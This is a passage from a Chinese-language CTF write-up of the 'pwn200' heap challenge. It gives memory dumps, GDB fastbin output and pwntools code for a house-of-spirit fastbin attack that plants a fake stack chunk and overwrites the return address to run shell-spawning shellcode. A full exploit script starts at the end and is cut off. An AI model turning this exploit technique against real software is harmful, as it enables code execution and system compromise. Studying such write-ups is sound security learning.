    0x603260:    0x4242424242424242    0x4242424242424242
    0x603270:    0x4242424242424242    0x4242424242424242
    0x603280:    0x4242424242424242    0x4242424242424242
    0x603290:    0x4242424242424242    0x4242424242424242
    0x6032a0:    0x4242424242424242    0x4242424242424242
    0x6032b0:    0x0000000000000000    0x0000000000000061
    0x6032c0:    0x00007ffff7dd1b78    0x0000000000603110  fake chunk
    0x7ffe5ce04cc0:    0x00007ffe5ce04d20    0x0000000000400b34 <--RIP
    0x7ffe5ce04cd0:    0x00007fc301e438e0    0x00007fc302056700
    0x7ffe5ce04ce0:    0x0000000000000030    0x0000000000000020 <--next size of fake chunk (id)
    0x7ffe5ce04cf0:    0x6e69622fb848686a    0xe7894850732f2f2f <--shellcode
    0x7ffe5ce04d00:    0x2434810101697268    0x6a56f63101010101
    0x7ffe5ce04d10:    0x894856e601485e08    0x050f583b6ad231e6
    0x7ffe5ce04d20:    0x00007ffe5ce04d40    0x0000000000400b59
    0x7ffe5ce04d30:    0x00007ffe5ce04e28    0x0000000100000000
    0x7ffe5ce04d40:    0x0000000000400b60    0x00007fc301a9f830
实现代码
    p.recvuntil("give me your id")
    p.sendline("32") # next size
    p.recvuntil("give me money")
    fake_chunk=shellcode_addr-0x40
    p.sendline(p64(0)*5+p64(0x41)+p64(0)*1+p64(fake_chunk)) #布置fake chunk
    p.sendline("2") #free(ptr)
调用free之后，我们成功将栈中的fake chunk并入fastbin。
    gef➤  heap bins fast 
    ─────────────────────[ Fastbins for arena 0x7fc301e43b20 ]─────────────────────
    Fastbin[0] 0x00
    Fastbin[1] 0x00
    Fastbin[2]  →   FreeChunk(addr=0x7ffe5ce04cb0,size=0x40)  
    Fastbin[3] 0x00
    Fastbin[4] 0x00
    Fastbin[5] 0x00
    Fastbin[6] 0x00
    Fastbin[7] 0x00
    Fastbin[8] 0x00
    Fastbin[9] 0x00
之后的操作只需要再申请回来，就能修改sub_400A29的EIP，修改EIP为shellcode。只需要check_out，退出栈的时候就会触发shellcode。
    p.sendline("1") # malloc(0x38)
    p.recvuntil("your choice : how long?")
    p.sendline("50")
    p.recvuntil("give me more money :")
    p.sendline(p64(0)*3+p64(shellcode_addr)) # overflow EIP
    p.sendline("3") #break
完整的Exp
    #! /usr/bin/python
    from pwn import *
    p=process("./pwn200")
    #context.log_level='Debug'
    #gdb.attach(p,"b *0x400a8e")
    shellcode=asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
    p.recvuntil("who are u?n")
    p.send(shellcode.ljust(48))
    p.recvuntil(shellcode.ljust(48))
    shellcode_addr=u64(p.recv(6).ljust(8,"x00"))-0x50
    print "Shellcode address="+hex(shellcode_addr)
    p.recvuntil("give me your id")
    p.sendline("32")